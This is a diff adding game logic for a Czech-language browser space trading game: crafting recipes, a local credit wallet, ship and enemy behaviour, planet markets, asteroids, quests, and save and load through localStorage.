+            { name: 'Rychlý motor', requires: { Ruda: 2, Komponenty: 3 }, bonus: 'maxSpeed', bonusVal: 0.8,
+            slot: 'motor' },
+            { name: 'Laserový zesilovač', requires: { Ruda: 1, Komponenty: 2 }, bonus: 'damagePct', bonusVal: 0.15,
+                slot: 'zbran' },
+            { name: 'Velký náklad', requires: { Ruda: 2, Komponenty: 2 }, bonus: 'maxCargo', bonusVal: 20,
+            slot: 'naklad' },
+            { name: 'Palivová nádrž', requires: { Ruda: 2, Komponenty: 1 }, bonus: 'maxFuel', bonusVal: 60,
+            slot: 'palivo' },
+            { name: 'Nanobot regenerace', requires: { Ruda: 3, Komponenty: 3 }, bonus: 'hpRegen', bonusVal: 0.10,
+                slot: 'regenerace' },
+            { name: 'Pokročilý radar', requires: { Ruda: 2, Komponenty: 2 }, bonus: 'radarRange', bonusVal: 200,
+                slot: 'radar' },
+            { name: 'Gyroskop', requires: { Ruda: 1, Komponenty: 1 }, bonus: 'rotationSpeed', bonusVal: 0.02,
+                slot: 'gyro' },
+        ];
+
+        // --- Wallet (stejné) ---
+        let walletBalance = 0;
+        let walletAddress = '';
+
+        function loadWallet() {
+            try {
+                const saved = localStorage.getItem('spaceRangersWallet');
+                if (saved) {
+                    const data = JSON.parse(saved);
+                    walletBalance = data.balance || 0;
+                    walletAddress = data.address || '';
+                    return true;
+                }
+            } catch (e) { console.warn('Wallet load error', e); }
+            return false;
+        }
+
+        function saveWallet() {
+            try {
+                localStorage.setItem('spaceRangersWallet', JSON.stringify({
+                    balance: walletBalance,
+                    address: walletAddress || 'SR-' + Math.random().toString(36).slice(2, 10).toUpperCase()
+                }));
+            } catch (e) { console.warn('Wallet save error', e); }
+        }
+
+        function createWallet() {
+            walletAddress = 'SR-' + Math.random().toString(36).slice(2, 10).toUpperCase();
+            walletBalance = 0;
+            saveWallet();
+            return true;
+        }
+
+        function addCredits(amount) {
+            walletBalance += amount;
+            saveWallet();
+            return true;
+        }
+
+        function subtractCredits(amount) {
+            if (walletBalance >= amount) {
+                walletBalance -= amount;
+                saveWallet();
+                return true;
+            }
+            return false;
+        }
+
+        // --- Game State ---
+        let game = {
+            state: 'MENU',
+            cameraX: 1000,
+            cameraY: 1000,
+            zoom: 1.0,
+            mapZoom: 0.15,
+            mapCameraX: 3000,
+            mapCameraY: 2000,
+            message: '',
+            messageTimer: 0,
+            credits: 0,
+            mouseX: 0,
+            mouseY: 0,
+            mouseWorldX: 0,
+            mouseWorldY: 0,
+            miningActive: false,
+            miningStats: {
+                hashCount: 0,
+                shareCount: 0,
+                totalEarned: 0,
+                startTime: 0,
+                hashrate: 0,
+                maxHashrate: 0,
+                difficulty: 6000000,
+            },
+            miningHistory: [],
+            miningTimer: 0,
+            displayedHashrate: 0,
+            miningSessionHashes: 0,
+            miningSessionShares: 0,
+            remotePlayers: [],
+            multiplayer: false,
+            autoBattle: false,
+            autoBattleTarget: null,
+            enemyBullets: [],
+            bullets: [],
+            floatingItems: [],
+            questProgress: { kill: 0, collect: 0 },
+            currentQuest: null,
+            autosaveTimer: 0,
+            tradingScroll: 0,
+            cargoScroll: 0,
+            skillPoints: 0,
+            starField: [],
+            planets: [],
+            enemies: [],
+            quests: [],
+            dockedPlanet: null,
+            asteroids: [],
+            asteroidMiningTarget: null,
+            asteroidMiningShares: 0,
+            asteroidMiningActive: false,
+            asteroidOreTypes: ['Ruda', 'Zlato', 'Stribro', 'Platina', 'Měď', 'Železo', 'Titan', 'Kobalt', 'Nikl', 'Cín',
+                'Zinek', 'Olovo'
+            ],
+            inventory: {
+                cargo: {},
+                equipped: { trup: null, stit: null, motor: null, zbran: null, naklad: null, palivo: null,
+                    regenerace: null, radar: null, gyro: null }
+            },
+            keys: { w: false, a: false, s: false, d: false, up: false, down: false, left: false, right: false }
+        };
+
+        // --- Ship ---
+        let ship = {
+            x: 1000,
+            y: 1000,
+            vx: 0,
+            vy: 0,
+            direction: 0,
+            hp: 100,
+            maxHp: 100,
+            shield: 50,
+            maxShield: 50,
+            fuel: 100,
+            maxFuel: 100,
+            cargo: {},
+            maxCargo: 50,
+            weapons: ['Laser I'],
+            level: 1,
+            xp: 0,
+            xpToLevel: 100,
+            name: 'Ranger',
+            thrustPower: 0.12,
+            maxSpeed: 5.0,
+            rotationSpeed: 0.08,
+            drag: 0.97,
+            shootDelay: 14,
+            lastShot: 0,
+            dockedAt: null,
+            appliedBonuses: {},
+            radarBonus: 0,
+            skills: { obchod: 0, stity: 0, zbrane: 0, motor: 0, naklad: 0 },
+            skillPoints: 0,
+            craftedBonuses: {},
+        };
+
+        // --- Helper functions ---
+        function dist(a, b) {
+            return Math.sqrt((a.x - b.x) ** 2 + (a.y - b.y) ** 2);
+        }
+
+        function rand(min, max) { return Math.random() * (max - min) + min; }
+
+        function randInt(min, max) { return Math.floor(rand(min, max + 1)); }
+
+        function clamp(v, min, max) { return Math.max(min, Math.min(max, v)); }
+
+        function lerp(a, b, t) { return a + (b - a) * t; }
+
+        function angleDiff(a, b) {
+            let d = b - a;
+            while (d > Math.PI) d -= 2 * Math.PI;
+            while (d < -Math.PI) d += 2 * Math.PI;
+            return d;
+        }
+
+        // --- Planet Class ---
+        function createPlanet(name, x, y, stationType) {
+            const types = {
+                'PLANET': { radius: 18, color: '#0066cc', label: 'Planeta', goodsCount: 8 },
+                'DOCKY': { radius: 14, color: '#6696c8', label: 'Doky', goodsCount: 10 },
+                'PIRATSKY_KLUB': { radius: 12, color: '#bb2222', label: 'Piratsky klub', goodsCount: 6 },
+                'HI_TECH_LAB': { radius: 13, color: '#22bbbb', label: 'Hi-Tech Lab', goodsCount: 12 },
+                'OBCHODNI_STANICE': { radius: 15, color: '#c89600', label: 'Obchodni stanice', goodsCount: 15 },
+            };
+            const t = types[stationType] || types['PLANET'];
+            const catMap = {
+                'PLANET': ['Minerály', 'Potraviny', 'Léky'],
+                'DOCKY': ['Zbraně', 'Technologie', 'Komponenty'],
+                'PIRATSKY_KLUB': ['Zbraně', 'Minerály', 'Luxus'],
+                'HI_TECH_LAB': ['Technologie', 'Léky', 'Komponenty'],
+                'OBCHODNI_STANICE': ['Minerály', 'Potraviny', 'Zbraně', 'Technologie', 'Léky', 'Luxus'],
+            };
+            const cats = catMap[stationType] || ['Minerály', 'Potraviny'];
+
+            const available = ALL_ITEMS.filter(it => cats.includes(it.category)).map(it => it.name);
+            const goods = {};
+            const count = Math.min(t.goodsCount, available.length);
+            const shuffled = [...available].sort(() => Math.random() - 0.5);
+            for (let i = 0; i < count; i++) {
+                goods[shuffled[i]] = randInt(5, 40);
+            }
+
+            const prices = {};
+            const basePrices = {
+                'Minerály': { base: 0.15, mult: 1.0 },
+                'Zbraně': { base: 0.60, mult: 1.2 },
+                'Potraviny': { base: 0.08, mult: 0.8 },
+                'Technologie': { base: 0.90, mult: 1.5 },
+                'Léky': { base: 0.30, mult: 1.1 },
+                'Luxus': { base: 1.50, mult: 2.0 },
+                'Komponenty': { base: 0.25, mult: 0.9 },
+            };
+            const stationMult = { 'PLANET': 1.0, 'DOCKY': 1.1, 'PIRATSKY_KLUB': 1.8, 'HI_TECH_LAB': 1.3,
+                'OBCHODNI_STANICE': 0.9 };
+            const sm = stationMult[stationType] || 1.0;
+
+            for (const item of ALL_ITEMS) {
+                const bp = basePrices[item.category];
+                if (bp) {
+                    let p = bp.base + rand(-0.08, 0.08);
+                    p = p * bp.mult * sm;
+                    p = Math.max(0.0001, Math.min(15, p));
+                    prices[item.name] = Math.round(p * 10000) / 10000;
+                } else {
+                    prices[item.name] = Math.round((rand(0.03, 0.60)) * 10000) / 10000;
+                }
+            }
+
+            return {
+                name,
+                x,
+                y,
+                stationType,
+                radius: t.radius,
+                color: t.color,
+                label: t.label,
+                goods,
+                prices,
+                availableItems: available,
+                tradeHistory: {},
+                lastUpdate: 0,
+                getTypeName() { return t.label; },
+                updatePrices() {
+                    const now = Date.now();
+                    if (now - this.lastUpdate < 30000) return;
+                    this.lastUpdate = now;
+                    for (const item of Object.keys(this.prices)) {
+                        const base = this._getBasePrice(item);
+                        if (this.tradeHistory[item] > 0) {
+                            this.prices[item] = Math.round(Math.min(base * 3, this.prices[item] * 1.08) * 10000) / 10000;
+                        } else if (this.tradeHistory[item] < 0) {
+                            this.prices[item] = Math.round(Math.max(base * 0.5, this.prices[item] * 0.92) * 10000) / 10000;
+                        }
+                        if (this.prices[item] > base) {
+                            this.prices[item] = Math.round(this.prices[item] * 0.995 * 10000) / 10000;
+                        } else if (this.prices[item] < base) {
+                            this.prices[item] = Math.round(this.prices[item] * 1.005 * 10000) / 10000;
+                        }
+                        this.prices[item] = Math.max(0.0001, Math.min(15, this.prices[item]));
+                    }
+                    this.tradeHistory = {};
+                },
+                _getBasePrice(item) {
+                    const bp = {
+                        'Minerály': 0.15,
+                        'Zbraně': 0.60,
+                        'Potraviny': 0.08,
+                        'Technologie': 0.90,
+                        'Léky': 0.30,
+                        'Luxus': 1.50,
+                        'Komponenty': 0.25
+                    };
+                    const cat = ITEM_CATEGORY_MAP[item] || 'Minerály';
+                    return bp[cat] || 0.15;
+                },
+                recordTrade(item, amount) {
+                    this.tradeHistory[item] = (this.tradeHistory[item] || 0) + amount;
+                },
+                generateNewGoods() {
+                    if (Object.keys(this.goods).length < 50) {
+                        const catMap = {
+                            'PLANET': ['Minerály', 'Potraviny', 'Léky'],
+                            'DOCKY': ['Zbraně', 'Technologie', 'Komponenty'],
+                            'PIRATSKY_KLUB': ['Zbraně', 'Minerály', 'Luxus'],
+                            'HI_TECH_LAB': ['Technologie', 'Léky', 'Komponenty'],
+                            'OBCHODNI_STANICE': ['Minerály', 'Potraviny', 'Zbraně', 'Technologie', 'Léky', 'Luxus'],
+                        };
+                        const cats = catMap[this.stationType] || ['Minerály'];
+                        const cat = cats[randInt(0, cats.length - 1)];
+                        const candidates = ALL_ITEMS.filter(it => it.category === cat && !this.goods[it.name]);
+                        if (candidates.length) {
+                            const item = candidates[randInt(0, candidates.length - 1)];
+                            this.goods[item.name] = randInt(5, 30);
+                        }
+                    }
+                }
+            };
+        }
+
+        // --- Enemy ---
+        function createEnemy(x, y, type) {
+            const isElite = type === 'Elite' || (type === 'Pirate' && Math.random() < 0.12);
+            const levelScale = 1 + (ship.level - 1) * 0.05;
+            return {
+                x,
+                y,
+                vx: 0,
+                vy: 0,
+                type: isElite ? 'Elite' : 'Pirate',
+                hp: isElite ? 220 * levelScale : 110 * levelScale,
+                maxHp: isElite ? 220 * levelScale : 110 * levelScale,
+                speed: isElite ? 2.5 * levelScale : 1.8 * levelScale,
+                direction: rand(0, Math.PI * 2),
+                shootTimer: randInt(40, 100),
+                color: isElite ? '#aa2222' : '#bb2222',
+                size: isElite ? 18 : 13,
+                drag: 0.95,
+                targetDirection: rand(0, Math.PI * 2),
+                directionChangeTimer: randInt(40, 120),
+                damage: isElite ? 22 * levelScale : 12 * levelScale,
+                shouldRemove: false,
+                accuracy: isElite ? 0.85 : 0.70,
+                shootCooldown: isElite ? 35 : 55,
+                fireTimer: 0,
+                update(targetX, targetY) {
+                    const dx = targetX - this.x;
+                    const dy = targetY - this.y;
+                    const d = Math.sqrt(dx * dx + dy * dy);
+
+                    this.directionChangeTimer--;
+                    if (this.directionChangeTimer <= 0) {
+                        this.targetDirection = rand(0, Math.PI * 2);
+                        this.directionChangeTimer = randInt(40, 120);
+                    }
+
+                    if (d <= RADAR_RANGE * 1.2) {
+                        const targetDir = Math.atan2(dy, dx);
+                        const diff = angleDiff(this.direction, targetDir);
+                        const turnSpeed = isElite ? 0.035 : 0.025;
+                        this.direction += Math.sign(diff) * Math.min(Math.abs(diff), turnSpeed);
+                        this.vx += Math.cos(this.direction) * 0.015 * (isElite ? 1.2 : 1);
+                        this.vy += Math.sin(this.direction) * 0.015 * (isElite ? 1.2 : 1);
+                    } else {
+                        this.direction = this.targetDirection;
+                        this.vx += Math.cos(this.direction) * 0.008;
+                        this.vy += Math.sin(this.direction) * 0.008;
+                    }
+
+                    const spd = Math.sqrt(this.vx * this.vx + this.vy * this.vy);
+                    if (spd > this.speed) {
+                        this.vx = (this.vx / spd) * this.speed;
+                        this.vy = (this.vy / spd) * this.speed;
+                    }
+                    this.x += this.vx;
+                    this.y += this.vy;
+                    this.vx *= this.drag;
+                    this.vy *= this.drag;
+
+                    this.fireTimer--;
+                    if (this.fireTimer <= 0 && d < 350) {
+                        this.fireTimer = this.shootCooldown + randInt(0, 20);
+                        const inaccuracy = (1 - this.accuracy) * 0.5;
+                        const aimDir = Math.atan2(dy, dx) + rand(-inaccuracy, inaccuracy);
+                        const bx = this.x + Math.cos(aimDir) * 16;
+                        const by = this.y + Math.sin(aimDir) * 16;
+                        const bvx = Math.cos(aimDir) * (4.5 + (isElite ? 1.2 : 0));
+                        const bvy = Math.sin(aimDir) * (4.5 + (isElite ? 1.2 : 0));
+                        return { x: bx, y: by, vx: bvx, vy: bvy, life: 80, damage: this.damage };
+                    }
+                    return null;
+                }
+            };
+        }
+
+        // --- Asteroid ---
+        function createAsteroid(x, y, size) {
+            const r = size || rand(12, 30);
+            return {
+                x,
+                y,
+                radius: r,
+                hp: 50,
+                maxHp: 50,
+                sharesMined: 0,
+                sharesNeeded: 50,
+                mined: false,
+                color: '#8B7D6B',
+                colorDark: '#5C4E3E',
+                rotation: rand(0, Math.PI * 2),
+                rotSpeed: rand(-0.01, 0.01),
+                vertices: (() => {
+                    const v = [];
+                    const n = randInt(6, 10);
+                    for (let i = 0; i < n; i++) {
+                        const angle = (i / n) * Math.PI * 2 + rand(-0.3, 0.3);
+                        const dist2 = r * rand(0.7, 1.0);
+                        v.push({ angle, dist: dist2 });
+                    }
+                    return v;
+                })(),
+                oreType: game.asteroidOreTypes[randInt(0, game.asteroidOreTypes.length - 1)],
+                oreAmount: randInt(1, 4),
+            };
+        }
+
+        function generateAsteroids(count) {
+            const asteroids = [];
+            for (let i = 0; i < count; i++) {
+                let x, y, valid;
+                let attempts = 0;
+                do {
+                    x = rand(200, WORLD_W - 200);
+                    y = rand(200, WORLD_H - 200);
+                    valid = true;
+                    for (const p of game.planets) {
+                        if (dist({ x, y }, p) < 250) { valid = false; break; }
+                    }
+                    for (const a of asteroids) {
+                        if (dist({ x, y }, a) < 60) { valid = false; break; }
+                    }
+                    attempts++;
+                } while (!valid && attempts < 50);
+                if (valid) {
+                    const size = rand(12, 32);
+                    asteroids.push(createAsteroid(x, y, size));
+                }
+            }
+            return asteroids;
+        }
+
+        // --- Generate Galaxy ---
+        function generateGalaxy() {
+            const planets = [];
+            const names = ['Zeme', 'Mars', 'Venuse', 'Malok Prime', 'Pelengia', 'Faegana', 'Gaalos',
+                'Klissan Alpha', 'Klissan Beta', 'Klissan Gamma', 'Nova Zeme', 'Havirov Prime',
+                'Hlavni Doky', 'Piratsky Klub', 'Hi-Tech Lab', 'Obchodni Stanice',
+                'Tajna Zakladna', 'Xenon Labs', 'Nova Terra', 'Kryton IV',
+                'Starbase Omega', 'Cerny Trh'
+            ];
+            const types = ['PLANET', 'PLANET', 'PLANET', 'PLANET', 'PLANET', 'PLANET',
+                'PLANET', 'PLANET', 'PLANET', 'PLANET', 'PLANET', 'PLANET',
+                'DOCKY', 'PIRATSKY_KLUB', 'HI_TECH_LAB', 'OBCHODNI_STANICE',
+                'PIRATSKY_KLUB', 'HI_TECH_LAB', 'PLANET', 'PLANET',
+                'DOCKY', 'PIRATSKY_KLUB'
+            ];
+            const coords = [
+                [1000, 1000],
+                [2500, 800],
+                [1800, 2200],
+                [500, 2800],
+                [3200, 1500],
+                [1500, 3500],
+                [3800, 2500],
+                [4200, 1200],
+                [4500, 2000],
+                [4000, 3000],
+                [800, 1800],
+                [300, 1200],
+                [2200, 1600],
+                [3500, 900],
+                [2800, 2800],
+                [3000, 3200],
+                [4200, 1800],
+                [4800, 1500],
+                [2000, 4000],
+                [5000, 2800],
+                [5500, 2000],
+                [4800, 3500]
+            ];
+            for (let i = 0; i < Math.min(names.length, coords.length); i++) {
+                planets.push(createPlanet(names[i], coords[i][0], coords[i][1], types[i]));
+            }
+            return planets;
+        }
+
+        // --- Generate Enemies ---
+        function generateEnemies(count) {
+            const enemies = [];
+            const asteroidPositions = game.asteroids.filter(a => !a.mined).map(a => ({ x: a.x, y: a.y }));
+            for (let i = 0; i < count; i++) {
+                let x, y;
+                if (asteroidPositions.length > 0 && Math.random() < 0.85) {
+                    const ref = asteroidPositions[randInt(0, asteroidPositions.length - 1)];
+                    const angle = rand(0, Math.PI * 2);
+                    const d = rand(100, 300);
+                    x = clamp(ref.x + d * Math.cos(angle), 100, WORLD_W - 100);
+                    y = clamp(ref.y + d * Math.sin(angle), 100, WORLD_H - 100);
+                } else {
+                    x = rand(200, WORLD_W - 200);
+                    y = rand(200, WORLD_H - 200);
+                }
+                const isElite = Math.random() < 0.15;
+                enemies.push(createEnemy(x, y, isElite ? 'Elite' : 'Pirate'));
+            }
+            return enemies;
+        }
+
+        // --- Generate Quests ---
+        function generateQuests() {
+            return [
+                { name: 'Doruc zbrane na Mars', type: 'deliver', item: 'Zbraně', amount: 5, from: 'Zeme', to: 'Mars',
+                    reward: 1.5 },
+                { name: 'Sber rudy v sektoru', type: 'collect', item: 'Ruda', amount: 20, reward: 1.0 },
+                { name: 'Znic piratske lodi', type: 'kill', amount: 3, reward: 2.5 },
+                { name: 'Doruc potraviny na Faeganu', type: 'deliver', item: 'Potraviny', amount: 10, from: 'Nova Zeme',
+                    to: 'Faegana', reward: 1.2 },
+                { name: 'Doruc technologie na Pelengii', type: 'deliver', item: 'Technologie', amount: 8,
+                    from: 'Hlavni Doky', to: 'Pelengia', reward: 1.8 },
+                { name: 'Doruc leky na Gaalos', type: 'deliver', item: 'Léky', amount: 12, from: 'Hi-Tech Lab',
+                    to: 'Gaalos', reward: 1.6 },
+            ];
+        }
+
+        // --- Generate Stars ---
+        function generateStars() {
+            const stars = [];
+            for (let i = 0; i < 600; i++) {
+                stars.push({ x: rand(0, WORLD_W), y: rand(0, WORLD_H), size: randInt(1, 3) });
+            }
+            return stars;
+        }
+
+        // --- Ship Methods ---
+        function shipApplyThrust(dir, amount) {
+            ship.vx += Math.cos(dir) * ship.thrustPower * amount;
+            ship.vy += Math.sin(dir) * ship.thrustPower * amount;
+            const spd = Math.sqrt(ship.vx * ship.vx + ship.vy * ship.vy);
+            if (spd > ship.maxSpeed) {
+                ship.vx = (ship.vx / spd) * ship.maxSpeed;
+                ship.vy = (ship.vy / spd) * ship.maxSpeed;
+            }
+        }
+
+        function shipRotateTo(targetDir) {
+            const diff = angleDiff(ship.direction, targetDir);
+            if (Math.abs(diff) < ship.rotationSpeed) {
+                ship.direction = targetDir;
+            } else {
+                ship.direction += Math.sign(diff) * ship.rotationSpeed;
+            }
+        }
+
+        function shipUpdate() {
+            ship.x += ship.vx;
+            ship.y += ship.vy;
+            ship.vx *= ship.drag;
+            ship.vy *= ship.drag;
+
+            if (ship.x < 20) { ship.x = 20;
+                ship.vx = Math.abs(ship.vx) * 0.5; }
+            if (ship.x > WORLD_W - 20) { ship.x = WORLD_W - 20;
+                ship.vx = -Math.abs(ship.vx) * 0.5; }
+            if (ship.y < 20) { ship.y = 20;
+                ship.vy = Math.abs(ship.vy) * 0.5; }
+            if (ship.y > WORLD_H - 20) { ship.y = WORLD_H - 20;
+                ship.vy = -Math.abs(ship.vy) * 0.5; }
+
+            const shieldRegen = 0.04 + (ship.appliedBonuses.shieldRegen || 0);
+            if (ship.shield < ship.maxShield) {
+                ship.shield = Math.min(ship.shield + shieldRegen, ship.maxShield);
+            }
+            const hpRegen = ship.appliedBonuses.hpRegen || 0;
+            if (hpRegen > 0 && ship.hp < ship.maxHp) {
+                ship.hp = Math.min(ship.hp + hpRegen, ship.maxHp);
+            }
+            if (ship.lastShot > 0) ship.lastShot--;
+        }
+
+        function shipGetTotalCargo() {
+            let total = 0;
+            for (const k of Object.keys(ship.cargo)) total += ship.cargo[k];
+            return total;
+        }
+
+        function shipAddCargo(item, amount) {
+            const current = ship.cargo[item] || 0;
+            if (current + amount <= ship.maxCargo) {
+                ship.cargo[item] = current + amount;
+                updatePassiveBonuses();
+                return true;
+            }
+            return false;
+        }
+
+        function shipRemoveCargo(item, amount) {
+            const current = ship.cargo[item] || 0;
+            if (current >= amount) {
+                ship.cargo[item] = current - amount;
+                if (ship.cargo[item] <= 0) delete ship.cargo[item];
+                updatePassiveBonuses();
+                return true;
+            }
+            return false;
+        }
+
+        function getSkillEffects() {
+            const s = ship.skills;
+            return {
+                barterBuy: s.obchod * 0.002,
+                barterSell: s.obchod * 0.002,
+                shieldMax: s.stity,
+                shieldRegen: s.stity * 0.01,
+                damagePct: s.zbrane * 0.01,
+                shootDelay: s.zbrane * 0.1,
+                speed: s.motor * 0.02,
+                thrust: s.motor * 0.001,
+                cargo: s.naklad * 2,
+            };
+        }
+
+        function updatePassiveBonuses() {
+            const se = getSkillEffects();
+            const newBonuses = {};
+            ship.radarBonus = 0;
+
+            if (se.cargo) newBonuses.maxCargo = (newBonuses.maxCargo || 0) + se.cargo;
+            if (se.shieldMax) newBonuses.maxShield = (newBonuses.maxShield || 0) + se.shieldMax;
+            if (se.speed) newBonuses.maxSpeed = (newBonuses.maxSpeed || 0) + se.speed;
+            if (se.thrust) newBonuses.thrustPower = (newBonuses.thrustPower || 0) + se.thrust;
+            if (se.shootDelay) newBonuses.shootDelay = (newBonuses.shootDelay || 0) + se.shootDelay;
+            if (se.shieldRegen) newBonuses.shieldRegen = (newBonuses.shieldRegen || 0) + se.shieldRegen;
+
+            for (const [item, count] of Object.entries(ship.cargo)) {
+                if (ITEM_PASSIVE_BONUSES[item]) {
+                    for (const [stat, val] of Object.entries(ITEM_PASSIVE_BONUSES[item])) {
+                        if (stat === 'radarRange') {
+                            ship.radarBonus += val * count;
+                        } else {
+                            newBonuses[stat] = (newBonuses[stat] || 0) + val * count;
+                        }
+                    }
+                }
+            }
+
+            for (const slot of Object.values(game.inventory.equipped)) {
+                if (slot && slot.bonus && slot.bonusVal) {
+                    const stat = slot.bonus;
+                    const val = slot.bonusVal;
+                    if (stat === 'radarRange') {
+                        ship.radarBonus += val;
+                    } else {
+                        newBonuses[stat] = (newBonuses[stat] || 0) + val;
+                    }
+                }
+            }
+
+            const baseMaxHp = 100,
+                baseMaxShield = 50,
+                baseMaxFuel = 100,
+                baseMaxCargo = 50;
+            const baseMaxSpeed = 5.0,
+                baseThrustPower = 0.12,
+                baseRotationSpeed = 0.08,
+                baseShootDelay = 14;
+
+            ship.maxHp = baseMaxHp + (newBonuses.maxHp || 0);
+            ship.maxShield = baseMaxShield + (newBonuses.maxShield || 0);
+            ship.maxFuel = baseMaxFuel + (newBonuses.maxFuel || 0);
+            ship.maxCargo = baseMaxCargo + (newBonuses.maxCargo || 0);
+            ship.maxSpeed = baseMaxSpeed + (newBonuses.maxSpeed || 0);
+            ship.thrustPower = baseThrustPower + (newBonuses.thrustPower || 0);
+            ship.rotationSpeed = baseRotationSpeed + (newBonuses.rotationSpeed || 0);
+            ship.shootDelay = Math.max(5, baseShootDelay - (newBonuses.shootDelay || 0));
+
+            ship.appliedBonuses = newBonuses;
+        }
+
+        // --- Init Game ---
+        function initGame() {
+            ship.x = 1000;
+            ship.y = 1000;
+            ship.vx = 0;
+            ship.vy = 0;
+            ship.direction = 0;
+            ship.hp = 100;
+            ship.maxHp = 100;
+            ship.shield = 50;
+            ship.maxShield = 50;
+            ship.fuel = 100;
+            ship.maxFuel = 100;
+            ship.cargo = {};
+            ship.maxCargo = 50;
+            ship.weapons = ['Laser I'];
+            ship.level = 1;
+            ship.xp = 0;
+            ship.xpToLevel = 100;
+            ship.skills = { obchod: 0, stity: 0, zbrane: 0, motor: 0, naklad: 0 };
+            ship.skillPoints = 0;
+            ship.dockedAt = null;
+            ship.appliedBonuses = {};
+            ship.radarBonus = 0;
+            ship.lastShot = 0;
+            ship.craftedBonuses = {};
+
+            game.cameraX = 1000;
+            game.cameraY = 1000;
+            game.zoom = 1.0;
+            game.planets = generateGalaxy();
+            game.asteroids = generateAsteroids(777);
+            game.enemies = generateEnemies(12);
+            game.quests = generateQuests();
+            game.currentQuest = null;
+            game.questProgress = { kill: 0, collect: 0 };
+            game.floatingItems = [];
+            game.bullets = [];
+            game.enemyBullets = [];
+            game.remotePlayers = [];
+            game.multiplayer = false;
+            game.autoBattle = false;
+            game.autoBattleTarget = null;
+            game.miningActive = false;
+            game.miningStats = { hashCount: 0, shareCount: 0, totalEarned: 0, startTime: 0, hashrate: 0, maxHashrate: 0,
+                difficulty: 6000000 };
+            game.miningHistory = [];
+            game.miningTimer = 0;
+            game.displayedHashrate = 0;
+            game.tradingScroll = 0;
+            game.cargoScroll = 0;
+            game.skillPoints = 0;
+            game.message = '';
+            game.messageTimer = 0;
+            game.asteroidMiningTarget = null;
+            game.asteroidMiningShares = 0;
+            game.asteroidMiningActive = false;
+            game.inventory.cargo = {};
+            game.inventory.equipped = { trup: null, stit: null, motor: null, zbran: null, naklad: null, palivo: null,
+                regenerace: null, radar: null, gyro: null };
+
+            updatePassiveBonuses();
+            game.credits = walletBalance;
+            ship.name = 'Ranger-' + Math.random().toString(36).slice(2, 6).toUpperCase();
+
+            if (!walletAddress) createWallet();
+            game.credits = walletBalance;
+            updateMenuWallet();
+
+            game.state = 'GAME';
+            showMessage('Vitejte, Rangere! W = let, A/D = otaceni, Space = strelba, K = Mining', 180);
+            hideAllScreens();
+        }
+
+        function loadGame() {
+            try {
+                const saved = localStorage.getItem('spaceRangersSave');
+                if (!saved) return false;
+                const data = JSON.parse(saved);
+                ship.x = data.x || 1000;
+                ship.y = data.y || 1000;
+                ship.hp = data.hp || 100;
+                ship.maxHp = data.maxHp || 100;
+                ship.shield = data.shield || 50;
+                ship.maxShield = data.maxShield || 50;
+                ship.fuel = data.fuel || 100;
+                ship.maxFuel = data.maxFuel || 100;
+                ship.cargo = data.cargo || {};
+                ship.maxCargo = data.maxCargo || 50;
+                ship.weapons = data.weapons || ['Laser I'];
+                ship.level = data.level || 1;
+                ship.xp = data.xp || 0;
+                ship.xpToLevel = data.xpToLevel || 100;
+                ship.skills = data.skills || { obchod: 0, stity: 0, zbrane: 0, motor: 0, naklad: 0 };
+                ship.skillPoints = data.skillPoints || 0;
+                ship.name = data.name || 'Ranger';
+                ship.thrustPower = data.thrustPower || 0.12;
+                ship.maxSpeed = data.maxSpeed || 5.0;
+                ship.rotationSpeed = data.rotationSpeed || 0.08;
+                ship.shootDelay = data.shootDelay || 14;
+                game.cameraX = data.cameraX || 1000;
+                game.cameraY = data.cameraY || 1000;
+                game.zoom = data.zoom || 1.0;
+                game.credits = data.credits || 0;
+                walletBalance = game.credits;
+                saveWallet();
+                game.inventory = data.inventory || { cargo: {}, equipped: { trup: null, stit: null, motor: null,
+                        zbran: null, naklad: null, palivo: null, regenerace: null, radar: null, gyro: null } };
+                updatePassiveBonuses();
+                game.planets = generateGalaxy();
+                game.asteroids = generateAsteroids(777);
+                game.enemies = generateEnemies(12);
+                game.quests = generateQuests();
+                game.currentQuest = null;
+                game.questProgress = { kill: 0, collect: 0 };
+                game.floatingItems = [];
+                game.bullets = [];
+                game.enemyBullets = [];
+                game.remotePlayers = [];
+                game.multiplayer = false;
+                game.autoBattle = false;
+                game.autoBattleTarget = null;
+                game.miningActive = false;
+                game.asteroidMiningTarget = null;
+                game.asteroidMiningShares = 0;
+                game.asteroidMiningActive = false;
+                game.state = 'GAME';
+                hideAllScreens();
+                showMessage('Hra nactena!', 120);
+                updateMenuWallet();
+                return true;
+            } catch (e) {
+                console.warn('Load error', e);
+                return false;
+            }
+        }
+
+        function saveGame() {
+            try {
+                const data = {
+                    x: ship.x,
+                    y: ship.y,
+                    hp: ship.hp,
+                    maxHp: ship.maxHp,
+                    shield: ship.shield,
+                    maxShield: ship.maxShield,
+                    fuel: ship.fuel,
+                    maxFuel: ship.maxFuel,
+                    cargo: ship.cargo,
+                    maxCargo: ship.maxCargo,
+                    weapons: ship.weapons,
+                    level: ship.level,
+                    xp: ship.xp,
+                    xpToLevel: ship.xpToLevel,
+                    skills: ship.skills,
+                    skillPoints: ship.skillPoints,
+                    name: ship.name,
+                    thrustPower: ship.thrustPower,
+                    maxSpeed: ship.maxSpeed,
+                    rotationSpeed: ship.rotationSpeed,
+                    shootDelay: ship.shootDelay,
+                    cameraX: game.cameraX,
+                    cameraY: game.cameraY,
+                    zoom: game.zoom,
+                    credits: game.credits,
+                    inventory: game.inventory,
+                };
+                localStorage.setItem('spaceRangersSave', JSON.stringify(data));
+            } catch (e) { console.warn('Save error', e); }
+        }
+
+        // --- UI Helpers ---
+        function hideAllScreens() {
+            document.querySelectorAll('#menu-screen, #docked-screen, #trading-screen, #quest-screen, #upgrade-screen, #fuel-screen, #credits-screen, #mining-log-screen, #skills-screen, #multiplayer-screen, #crafting-screen, #inventory-screen')
+                .forEach(el => el.classList.add('hidden'));
+            document.getElementById('ui-overlay')?.classList.remove('active');
+        }
+
+        function showScreen(el) {
+            hideAllScreens();
+            el.classList.remove('hidden');
+        }
+
+        function updateMenuWallet() {
+            menuWallet.textContent = `Wallet: ${walletBalance.toFixed(4)} HVC`;
+        }
+
+        function showMessage(text, duration) {
+            game.message = text;
+            game.messageTimer = duration || 120;
+        }
+
+        // --- Trading (stejný) ---
+        function openTrading() {
+            if (!game.dockedPlanet) return;
+            game.state = 'TRADING';
+            game.tradingScroll = 0;
+            game.cargoScroll = 0;
+            showScreen(tradingScreen);
+            renderTrading();
+        }
+
+        function renderTrading() {
+            const planet = game.dockedPlanet;
+            if (!planet) return;
+            document.getElementById('tradeStation').textContent =
+                `${planet.name} (${planet.getTypeName()}) | Kredity: ${walletBalance.toFixed(4)} HVC`;
+
